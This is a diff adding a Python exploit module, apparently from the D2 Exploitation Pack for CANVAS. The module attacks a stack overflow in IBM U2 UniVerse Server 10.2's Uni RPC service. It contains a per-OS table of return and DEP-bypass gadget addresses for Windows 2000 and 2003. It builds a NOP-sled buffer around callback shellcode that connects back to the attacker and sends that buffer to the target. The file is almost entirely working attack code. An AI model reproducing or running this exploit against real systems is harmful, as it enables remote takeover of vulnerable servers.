@@ -1,0 +1,179 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+
+import sys
+
+if "." not in sys.path:
+    sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "IBM U2 UniVerse Server 10.2 - Uni RPC Service Stack Overflow"
+
+DESCRIPTION = "Stack overflow vulnerability in IBM U2 UniVerse Server 10.2 Uni RPC Service"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["Versions Affected"] = "IBM U2 UniVerse Server 10.2"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"]= "Uni RPC Service must be started in debug level 8"
+
+
+VERSION = "1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "2000", "2003" ]
+
+NOTES = """
+"""
+
+CHANGELOG = """
+"""
+
+targets = {    
+    0: ['Windows 2000 SP4 English', 0x7c4e1f89],  # call esi @ kernel32.dll
+    1: ['Windows 2000 SP4 French',  0x77e71f89],  # call esi @ kernel32.dll    
+    2: ['Windows 2003 SP0 English', 0x77e41fcf],  # call esi @ kernel32.dll
+    3: ['Windows 2003 SP0 French',  0x77e21fcf],  # call esi @ kernel32.dll
+    4: ['Windows 2003 SP1 English (DEP)', 0x7c83e413, 0x77e46b69, 0x77e6c214, 0x77e503a6, 0x77e8965d], # anti-dep / call esp @ kernel32.dll / ...
+    5: ['Windows 2003 SP1 French (DEP)',  0x7c95e413, 0x7c806b69, 0x7c82c214, 0x7c8103a6, 0x7c84965d], # anti-dep / call esp @ kernel32.dll / ...
+    6: ['Windows 2003 SP2 English (DEP)', 0x7c83f517, 0x77e5f2df, 0x77e6386a, 0x77e6865a, 0x5f27ddee], # anti-dep / call esp @ kernel32.dll / ...
+    7: ['Windows 2003 SP2 French (DEP)',  0x7c95f517, 0x7c81f2df, 0x7c82386a, 0x7c82865a, 0x5d3dddee], # anti-dep / call esp @ kernel32.dll / ... 
+}  
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.port = 31438
+        self.host = ""                                
+        self.name = NAME   
+        self.badstring = "\x00"     
+        return
+        
+    def neededListenerTypes(self):
+				return [canvasengine.WIN32MOSDEF]
+				
+    def createShellcode(self):
+				return self.createSmallWin32Shellcode(self.callback.ip, self.callback.port, subesp = 1000)
+				
+    def test(self):        
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))
+                
+        s = self.gettcpsock()        
+        
+        try:
+            s.connect((self.host, self.port))
+        except:
+            self.log("No connection could be established")
+            return 0        
+        
+        return 1
+    
+    def run(self):	    		
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port))        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        try:            
+            s = self.gettcpsock()
+            s.connect((self.host, self.port))
+            s.sendall(sploitstring)
+        except:            
+            self.log("Attack reported no open socket - service died?")
+            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME, self.host, self.port))
+            return 0
+        
+        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME, self.host, self.port))
+        
+        return 1
+        
+    def makesploit(self):
+        """
+        Construct the attack        			  
+				
+				"""        								
+				
+        if (self.version >= 4): # Windows 2003 SP1/SP2
+					os_name, anti_dep, jmp_esp, pop_eax2, add_eax2, add_ebp2 = targets[self.version]
+				  					
+					ret = struct.pack('<L', anti_dep)
+					myjmp = struct.pack('<L', jmp_esp)								
+										
+					data_1 = "\x6c\x01\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02"
+					data_2 = "\x90" * 99					
+					data_3 = "\x90" * 900					
+					data_4 = "\x00\x00\x00\x00"
+										
+					tmp = data_3[0:399]
+					tmp += self.shellcode
+					tmp += data_3[399 + len(self.shellcode):]	
+					
+					tmp2 = tmp[0:395]
+					tmp2 += myjmp
+					tmp2 += tmp[395:]	
+					
+					pop_eax = struct.pack('<L', pop_eax2)	# pop eax @ kernel32.dll
+					add_eax = struct.pack('<L', add_eax2) # add eax,fe101c88 @ kernel32.dll
+					add_ebp = struct.pack('<L', add_ebp2) # add ebp,eax @ kernel32.dll
+					
+					val1 = struct.pack('<L', 0x1efe078) # FFFFFC00 = val1 + fe101c88					
+					
+					sploitstring = data_1 + tmp2 + data_2 + pop_eax + val1 + add_eax + add_ebp + ret + data_4					
+				
+        else:                   # Windows 2000 / Windows 2003 SP0
+					os_name, jmp = targets[self.version]
+					
+					data_1 = "\x6c\x01\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x04\x00\x00\x00\x02"
+					data_2 = "\x90" * 103
+					data_3 = "\x90" * 900
+					data_4 = "\x00\x00\x00\x00"
+					
+					ret = struct.pack('<L', jmp)														
+					
+					tmp = data_3[0:4]
+					tmp += self.shellcode
+					tmp += data_3[4 + len(self.shellcode):]	
+					
+					sploitstring = data_1 + tmp + data_2 + ret + data_4
+        
+        return sploitstring
+        
+    def usage(self):
+        print 'Usage: %s -v version -t host -l localIP -d localPort'%(sys.argv[0])
+        
+        i = 0
+        
+        print 'Available versions:'
+        
+        for listline in targets.values():
+            print '\t%d: %s'%(i, listline[0])
+            i = i + 1
+        
+        sys.exit(0) 
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION, VERSION)
+    app = theexploit()
+    ret=standard_callback_commandline(app)
+    
